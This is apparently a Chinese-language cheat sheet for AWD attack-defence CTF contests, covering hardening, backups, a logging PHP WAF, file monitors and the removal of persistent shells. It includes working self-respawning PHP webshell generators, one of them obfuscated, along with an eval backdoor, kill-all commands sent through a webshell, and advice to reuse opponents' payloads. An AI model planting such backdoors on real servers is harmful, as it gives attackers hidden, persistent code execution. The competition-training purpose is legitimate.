# AWD

##  修改ssh密码

~~~cmd
passwd username
# 输入密码确认即可
~~~

## 修改数据库密码及备份数据库（以 mysql 为例）

修改 mysql 密码

```mysql
1. 登录 mysql 终端，运行：
mysql> set password=password('new passwd');
mysql>flush privileges;
2. 修改 mysql user 表
mysql>use mysql;
mysql>update user set password=password('new password') where user='root';
mysql>flush privileges;
3. 使用 GRANT 语句
mysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'127.0.0.1' IDENTIFIED BY 'new password' WITH GRANT OPTION;
mysql>flush privileges;
4. mysqladmin
[root@ubuntu]# mysqladmin -u root passwd "new passwd";（注意双引号或不加）
```

备份指定的多个数据库

```
[root@ubuntu]# mysqldump -u root -p --databases databasesname > /tmp/db.sql
```

数据库恢复，在mysql终端下执行

## 源码备份

```shell
# 打包目录
tar -zcvf archive_name.tar.gz directory_to_compress
# 解包
tar -zxvf archive_name.tar.gz
```

之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码

## 上 WAF

~~~shell
# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 <?php require_once "/tmp/waf.php";?>
find /var/www/html -path /var/www/html -prune -o  -type f -name '*.php'|xargs  sed -i '1i<?php require_once "/tmp/waf.php";?>'
~~~

也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限

```shell
; Automatically add files before PHP document.
; http://php.net/auto-prepend-file
auto_prepend_file = /tmp/waf.php
```

附上郁离歌的一枚 WAF，会在 `/tmp/loooooooogs` 目录下生成日志文件

```php
<?php

error_reporting(0); 
define('LOG_FILEDIR','/tmp/loooooooogs');
if(!is_dir(LOG_FILEDIR)){
	mkdir(LOG_FILEDIR);
}
function waf() 
{ 
if (!function_exists('getallheaders')) { 
function getallheaders() { 
foreach ($_SERVER as $name => $value) { 
if (substr($name, 0, 5) == 'HTTP_') 
$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
} 
return $headers; 
} 
} 
$get = $_GET; 
$post = $_POST; 
$cookie = $_COOKIE; 
$header = getallheaders(); 
$files = $_FILES; 
$ip = $_SERVER["REMOTE_ADDR"]; 
$method = $_SERVER['REQUEST_METHOD']; 
$filepath = $_SERVER["SCRIPT_NAME"]; 
foreach ($_FILES as $key => $value) { 
$files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); 
file_put_contents($_FILES[$key]['tmp_name'], "virink"); 
}

unset($header['Accept']);
$input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);

logging($input);

}

function logging($var){ 
$filename = $_SERVER['REMOTE_ADDR'];
$LOG_FILENAME = LOG_FILEDIR."/".$filename;
$time = date("Y-m-d G:i:s");
file_put_contents($LOG_FILENAME, "\r\n".$time."\r\n".print_r($var, true), FILE_APPEND); 
file_put_contents($LOG_FILENAME,"\r\n".'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);
file_put_contents($LOG_FILENAME,"\r\n***************************************************************",FILE_APPEND);
}

waf(); 
?>
```

生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。

## 不死马

直接linux执行

~~~shell
while true;do echo '<?php eval($_POST["x"]);?>' > x.php;sleep 1;done
~~~

或
**bs1.php**
访问后同目录持续生成 `.test.php` 文件

```php
<?php
set_time_limit(0);
//程序执行时间
ignore_user_abort(1);
//关掉终端后脚本仍然运行
unlink(__FILE__);
//文件完整名
while(1) {
 file_put_contents('.test.php','<?php $a=array($_REQUEST["x"]=>"3");   // pwd=x
$b=array_keys($a)[0];
eval($b);?>');
 sleep(5);
}
?>
```

**bs2.php**
访问后同目录持续生成 `.config.php` 文件

```php
<?php
 set_time_limit(0);
 ignore_user_abort(1);
 unlink(_FILE);
 while(1){
  file_put_contents('./.config.php','<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>');
  system('chmod777.config.php');
  touch("./.config.php",mktime(20,15,1,11,28,2016));   // pwd=1
  usleep(100);
  }
?>
```

## 命令find进行文件监控

寻找最近20分钟修改的文件

```
find /var/www/html -name *.php -mmin -20
```

## Shell监控新增文件

创建文件的时候更改文件创建时间熟悉可能监测不到。

```shell
#!/bin/bash
while true
do
    find /var/www/html -cmin -60 -type f | xargs rm -rf
    sleep 1
done
```

循环监听一小时以内更改过的文件或新增的文件，进行删除。

## Python检测新增文件

放在 `/var/www/` 或 `/var/www/html` 下执行这个脚本，它会先备份当然目录下的所有文件，然后监控当前目录，一旦当前目录下的某个文件发生变更，就会自动还原，有新的文件产生就会自动删除。

~~~python
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = {} # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log' # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = {
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
}


def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):
    if noneToNull and value is None:
        return NULL
    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value
    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = {}
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
~~~

## 修改curl

获取flag一般都是通过执行 `curl http://xxx.com/flag.txt`
更改其别名，使其无法获取flag内容：

```shell
alias curl = 'echo flag{e4248e83e4ca862303053f2908a7020d}' 使用别名，
chmod -x curl  降权，取消执行权限
```

## 克制不死马、内存马

使用条件竞争的方式，不断循环创建和不死马同名的文件和文件夹，在此次比赛中使用此方式克制
了不死马。

~~~shell
#!/bin/bash
dire="/var/www/html/.base.php/"
file="/var/www/html/.base.php"
rm -rf $file
mkdir $dire
./xx.sh
~~~

## 创建后台进程

创建后台进程

```bash
nohup sudo ./Cardinal > output.log 2>&1 &
```

## 杀不死马

建立一个和不死马一样名字的文件夹，这样不死马就写不进去了。完全杀死不死马，得清理内存。

```bash
rm -rf .2.php | mkdir .2.php
```

杀进程得在root或者www-data权限下。如上传一句话，然后执行 system(‘kill -9 -1’); 杀死所有进程，再手动删除木马

```php
shell.php: <?php @eval($_GET['9415']); ?>
url访问：shell.php?9415=system('kill -9 -1');
```

用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值.
top 查看占用率最高的cpu进程
q 退出
M 根据驻留内存大小进行排序
P 根据CPU使用百分比大小进行排序

```php
<?php
	   while (1) {
		$pid = 不死⻢的进程PID;
		@unlink("c.php");
		exec("kill -9 $pid");
		usleep(1000);
	}?>
```

重启 apache，php 等web服务（一般不会有权限）

## 监测payload

`tail -f *.log`，看日志，不言而喻，抓他们的payload并利用。

## 中间件日志

⽐如apache，nginx
查看当前访问量前⼗的链接

```bash
cat /var/log/apache2/access.log |awk '{print $7}'|sort|uniq -c| sort -r|head
```

# AWD2

## 检查可登陆用户

- `cat /etc/passwd|grep -v nologin`

## 检查crontab执行权限

- `/var/adm/cron/` 下看`cron.allow` 和`cron.deny`， 如果两个文件都不存在，则只有root 用户能执行crontab 命令，allow 里存放允许的用户，deny 里存放拒绝的用户，以allow 为准。

## 备份/还原源码
```bash
tar -zcvf web.tar.gz /var/www/html/
tar -zxvf web.tar.gz
```
## 备份/还原数据库
```bash
mysql -uroot -proot -e "select user,host from mysql.user;"
mysqldump -uroot -proot db_name > /tmp/bak.sql
mysqldump -uroot -proot --all-databases > bak.sql
mysql -uroot -proot db_name < bak.sql
>	source bak.sql		# 交互模式下导入sql
```
## 关闭mysql远程连接
```sql
mysql -u root -p
mysql> use mysql;
mysql> update user set host = 'localhost' where user='root' and host='%';
mysql> flush privileges;
mysql> exit;
```
## 删除不死马
```bash
rm -rf .index.php | mkdir .index.php		# 竞争写入同名文件
kill -9 -1
kill apache2
ps aux | grep www-data | awk '{print $2}' | xargs kill -9
```
## 重启服务器
```bash
while : ;do kill -9 <PID>; done;
while : ;do echo 'aa'> shell.php; done;
```

# AWD+

https://github.com/admintony/Prepare-for-AWD

## PHP软waf

- 项目地址：https://github.com/leohearts/awd-watchbird/

```html
https://github.com/leohearts/awd-watchbird
```

- 将waf.so、watchbird.php文件存放在`/var/www/html`或其他目录中。
- 将watchbird.php放在www-data可读的目录, 确保当前用户对目标目录可写, 然后执行。

```
php watchbird.php --install /web
```

- 访问任意启用了waf的文件, 参数`?watchbird=ui`。
- 如需卸载, 请在相同的位置输入：

```
php watchbird.php --uninstall [Web目录]
```

